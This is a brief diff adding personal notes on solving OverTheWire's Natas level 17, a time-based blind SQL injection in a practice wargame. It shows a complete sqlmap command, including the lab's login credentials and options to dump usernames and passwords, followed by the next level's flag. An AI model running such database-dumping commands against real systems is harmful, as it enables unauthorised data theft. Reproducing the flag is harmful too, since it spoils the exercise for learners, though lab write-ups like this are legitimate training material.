@@ -1,0 +1,6 @@
+Another blind SQL injection - timing sql attack.
+I got lazy and used the easy way out: using sqlmap
+sqlmap -u "http://natas17.natas.labs.overthewire.org" --technique=T --auth-type=Basic --auth-cred=natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw --data "username=natas18" -D natas17 -T users -C
+username,password --dump --level=5 --risk=3 --dbms=mysql
+
+natas18 flag retrieved: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
